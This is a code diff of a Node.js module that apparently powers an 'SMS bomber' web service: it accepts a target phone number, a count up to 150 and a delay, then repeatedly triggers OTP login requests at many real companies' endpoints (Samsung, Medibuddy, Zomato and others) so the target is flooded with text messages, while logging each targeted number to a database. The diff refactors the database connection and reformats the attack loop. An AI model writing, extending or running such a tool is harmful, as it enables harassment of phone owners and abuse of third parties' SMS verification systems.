@@ -1,14 +1,11 @@
 const cryptojs = require("crypto-js")
-const {MongoClient} = require("mongodb")
-let client = new MongoClient(process.env.MONGO_URL)
 
-async function adddata(number, times, date) {
-    let conn = await client.connect()
-    let db = conn.db("website")
+async function adddata(number, times, date, connection) {
+    let db = connection.db("website")
     let stats = db.collection("stats")
-    stats.updateOne({app:"sms"},{$inc:{count:1}})
+    stats.updateOne({ app: "sms" }, { $inc: { count: 1 } })
     let sms = db.collection("sms")
-    sms.insertOne({number: number, times: times, time:date})
+    sms.insertOne({ number: number, times: times, time: date })
 }
 
 function hash(data) {
@@ -318,12 +315,12 @@ async function medibuddy(number) {
                 "flow": "Retail-Login-Home-Flow",
                 "idealLoginFlow": false,
                 "mb-s-platform": "infiniti-web",
-                "mb-s-sessionId": (Date.now()-10000).toString()+"__WEB__EWFI",
+                "mb-s-sessionId": (Date.now() - 10000).toString() + "__WEB__EWFI",
                 "mbUserId": null,
                 "phonenumber": number,
                 "platform": "medibuddy",
                 "source": "medibuddyInWeb"
-                })
+            })
         }).then((res) => {
             let contenttype = res.headers.get("content-type")
             if (contenttype && contenttype.includes("application/json") === true) {
@@ -983,55 +980,51 @@ async function uspolo(number) {
 }
 
 async function samson(number) {
-    return new Promise((resolve)=>{
-        fetch("https://www.samsung.com/in/api/v1/sso/otp/init",{
-            method:"POST",
-            headers:{
+    return new Promise((resolve) => {
+        fetch("https://www.samsung.com/in/api/v1/sso/otp/init", {
+            method: "POST",
+            headers: {
                 "Content-Type": "application/json"
             },
-            body:JSON.stringify({"user_id":number})
-        }).then((res)=>{
+            body: JSON.stringify({ "user_id": number })
+        }).then((res) => {
             let contenttype = res.headers.get("content-type")
             if (contenttype && contenttype.includes("application/json") === true) {
                 return res.json()
             } else {
                 resolve(false)
             }
-        }).then((data)=>{
+        }).then((data) => {
             resolve(data?.statusCode === 200)
         })
     })
-    
+
 }
 
 
-async function eachcall(number,limit,t,list,ws,speed){
-    if(limit === 0) return;
+async function eachcall(number, limit, t, list, ws, speed) {
+    if (limit === 0) return;
     let res = await list[t % list.length](number)
     if (res) {
-        ws.send(JSON.stringify({error:false, message:"1"}))
-        setTimeout(() => {
-            eachcall(number,limit-1,t+1,list,ws,speed)
-        }, speed)
-        
-    }else{
-        setTimeout(() => {
-            eachcall(number,limit,t+1,list,ws,speed)
-        }, speed)
+        ws.send(JSON.stringify({ error: false, message: "1" }))
+        limit--
     }
-    
+    setTimeout(() => {
+        eachcall(number, limit, t + 1, list, ws, speed)
+    }, speed)
+
 }
 
-function getdate(){
+function getdate() {
     let date = new Date()
     date.setMinutes(date.getMinutes() + 330)
     return date.toString()
 }
 
-function shuffle(){
+function shuffle() {
     let list = [samson, ajio, blinkit, byjus, derma, fancode, fantv, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, uspolo, zee5, zomato, nxtwave]
-    for(let i = list.length-1; i>0; i--){
-        let j = parseInt(Math.random() * (i+1))
+    for (let i = list.length - 1; i > 0; i--) {
+        let j = parseInt(Math.random() * (i + 1))
         let temp = list[i]
         list[i] = list[j]
         list[j] = temp
@@ -1039,53 +1032,53 @@ function shuffle(){
     return list
 }
 
-async function sendsms(number, ws, limit, speed) {
-    adddata(number,limit,getdate())
+async function sendsms(number, ws, limit, speed, connection) {
+    adddata(number, limit, getdate(), connection)
     let list = shuffle()
-    eachcall(number,limit,0,list,ws,speed)
+    eachcall(number, limit, 0, list, ws, speed)
 }
 
 
-async function startsmsprocessing(message,ws){
+async function startsmsprocessing(message, ws, connection) {
     let data, status = true;
-        try {
-            data = JSON.parse(message)
-        } catch (err) {
-            ws.send(JSON.stringify({error:true, message:"invalid json data"}))
-            return;
-        }
-        data = cryptojs.AES.decrypt(data.token, process.env.SMS_API_KEY).toString(cryptojs.enc.Utf8)
-        if (!data) {
-            ws.send(JSON.stringify({error:true, message:"invalid token"}))
-            return;
-        }
-        try {
-            data = JSON.parse(data)
-        } catch (err) {
-            ws.send(JSON.stringify({error:true, message:"invalid json data after decryption"}))
-            return;
-        }
-        if (!data.number || !/^[0-9]{10}$/.test(data.number) ) {
-            ws.send(JSON.stringify({error:true, message:"number is required or is invalid", problem:"number"}))
-            status = false
-        } if(data.number === "8639625032" || data.number==="7075087701"){
-            ws.send(JSON.stringify({error:true, message:"Number is Blocked"}))
-            status = false
-        } if (!data.times || !/^[0-9]{1,3}$/.test(data.times)) {
-            ws.send(JSON.stringify({error:true, message:"times is required or is invalid", problem:"times"}))
-            status = false
-        } if(parseInt(data.times) > 150){
-            ws.send(JSON.stringify({error:true, message:"times is too large"}))
-            status = false
-        }
-        if (!data.speed || !/^[0-9]{1,5}$/.test(data.speed)) {
-            ws.send(JSON.stringify({error:true, message:"speed is required or is invalid", problem:"speed"}))
-            status = false
-        } if (!status) {
-            return;
-        }
-        ws.send(JSON.stringify({error:false, message:"processing"}))
-        sendsms(data.number, ws, parseInt(data.times), parseInt(data.speed))
+    try {
+        data = JSON.parse(message)
+    } catch (err) {
+        ws.send(JSON.stringify({ error: true, message: "invalid json data" }))
+        return;
+    }
+    data = cryptojs.AES.decrypt(data.token, process.env.SMS_API_KEY).toString(cryptojs.enc.Utf8)
+    if (!data) {
+        ws.send(JSON.stringify({ error: true, message: "invalid token" }))
+        return;
+    }
+    try {
+        data = JSON.parse(data)
+    } catch (err) {
+        ws.send(JSON.stringify({ error: true, message: "invalid json data after decryption" }))
+        return;
+    }
+    if (!data.number || !/^[0-9]{10}$/.test(data.number)) {
+        ws.send(JSON.stringify({ error: true, message: "number is required or is invalid", problem: "number" }))
+        status = false
+    } if (data.number === "8639625032" || data.number === "7075087701") {
+        ws.send(JSON.stringify({ error: true, message: "Number is Blocked" }))
+        status = false
+    } if (!data.times || !/^[0-9]{1,3}$/.test(data.times)) {
+        ws.send(JSON.stringify({ error: true, message: "times is required or is invalid", problem: "times" }))
+        status = false
+    } if (parseInt(data.times) > 150) {
+        ws.send(JSON.stringify({ error: true, message: "times is too large" }))
+        status = false
+    }
+    if (!data.speed || !/^[0-9]{1,5}$/.test(data.speed)) {
+        ws.send(JSON.stringify({ error: true, message: "speed is required or is invalid", problem: "speed" }))
+        status = false
+    } if (!status) {
+        return;
+    }
+    ws.send(JSON.stringify({ error: false, message: "processing" }))
+    sendsms(data.number, ws, parseInt(data.times), parseInt(data.speed), connection)
 }
 
-module.exports = {startsmsprocessing}
+module.exports = { startsmsprocessing }
